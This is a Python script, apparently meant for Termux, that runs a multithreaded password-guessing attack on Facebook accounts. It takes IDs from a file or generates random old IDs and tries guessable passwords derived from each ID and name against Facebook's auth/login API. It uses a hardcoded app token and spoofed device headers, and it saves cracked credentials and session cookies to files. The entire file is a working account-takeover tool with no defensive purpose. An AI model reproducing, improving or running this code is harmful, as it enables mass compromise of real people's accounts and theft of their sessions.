import os, sys, time, random, string, requests, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- Permission & Storage ---
if not os.path.exists('/sdcard'): os.system('termux-setup-storage')

loop = 0
oks = []
cps = []

# 🎨 THEME (Elite Dark Mode)
Y = '\033[1;33m' # Gold
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
G = '\033[1;32m' # Green
B = '\033[1;34m' # Blue

def get_heavy_ua():
    brand = random.choice(["Samsung", "Vivo", "Oppo", "Xiaomi", "Tecno", "Realme"])
    models = ["SM-G998B", "V2303", "RMX3840", "KJ5", "CPH2581"]
    model = random.choice(models)
    android_ver = random.choice(['11', '12', '13', '14', '15'])
    fbv = f"{random.randint(440, 580)}.0.0.{random.randint(10, 99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/TP1A.{random.randint(230000, 239999)}.001) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density={random.choice(['2.0','3.0'])},width=1080,height=2400}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

def banner():
    os.system('clear')
    print(f"""{B}
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
{W}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G}    [+] VERSION  : {W}V22 ULTRA PRO    {G}[+] METHOD   : {W}MULTI-API + COOKIE
{G}    [+] TARGET   : {W}OLD/RANDOM/FILE  {G}[+] STATUS   : {W}CP-BYPASS-ACTIVE
{W}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def crack_heavy(user_data):
    global loop, oks, cps
    try:
        uid, name = user_data.split('|')
    except:
        uid = user_data.split('|')[0]
        name = "Facebook User"
    
    sys.stdout.write(f'\r {W}[{B}EXECUTOR{W}] {loop} | {G}OK:{len(oks)} | {R}CP:{len(cps)} '); sys.stdout.flush()
    
    first = name.split(' ')[0].lower()
    pws = [uid, uid[6:], first+'123', first+'786', 'pakistan', '786786', 'khan123', 'khan786', '000786']
    
    for pw in pws:
        if len(pw) < 6: continue
        session = requests.Session()
        ua = get_heavy_ua()
        
        # --- Ultra Pro Headers (Device Fingerprinting) ---
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-device-group': str(random.randint(1000, 9999)),
            'x-fb-request-analytics-tags': 'graph_service',
            'x-fb-device-model': 'SM-G998B',
            'x-fb-device-resolution': '1080x2400'
        }
        
        try:
            # API Method Rotation
            api_url = random.choice(["https://b-graph.facebook.com/auth/login", "https://graph.facebook.com/auth/login"])
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "email": uid, "password": pw, "sdk_style": "android",
                "generate_session_cookies": "1", "locale": "en_US", "method": "post"
            }
            res = session.post(api_url, data=data, headers=headers).json()
            
            if "session_key" in res:
                cookie = ";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                print(f'\r\n{G} [OK] {uid} | {pw}')
                print(f'{Y} [COOKIE] {W}{cookie}')
                oks.append(uid)
                open('/sdcard/OK_V22.txt', 'a').write(f"{uid}|{pw}|{cookie}\n")
                break
            elif "checkpoint" in str(res):
                print(f'\r\n{R} [CP] {uid} | {pw}')
                cps.append(uid)
                open('/sdcard/CP_V22.txt', 'a').write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def main():
    banner()
    print(f" {B}[1] File Cloning (Cookie + Multi-API)")
    print(f" {B}[2] Random Old ID Cloning (2004-2011)")
    print(f" {B}[0] Exit")
    opt = input(f"\n {G}[?] Selection : {W}")
    
    if opt == '1':
        path = input(f" {G}[+] Enter File Path : {W}")
        ids = open(path, 'r').read().splitlines()
        banner()
        print(f" {G}[+] TOTAL IDs : {len(ids)}")
        with tred(max_workers=60) as engine:
            for user in ids: engine.submit(crack_heavy, user)
    elif opt == '2':
        banner()
        limit = int(input(f" {G}[?] ID Limit : {W}"))
        prefix = random.choice(['100000', '100001', '1000000'])
        random_ids = [prefix + "".join(random.choices(string.digits, k=9)) + "|Vintage User" for _ in range(limit)]
        banner()
        print(f" {G}[+] TOTAL RANDOM OLD IDs : {len(random_ids)}")
        with tred(max_workers=60) as engine:
            for user in random_ids: engine.submit(crack_heavy, user)
    else: exit()

if __name__ == "__main__":
    main()
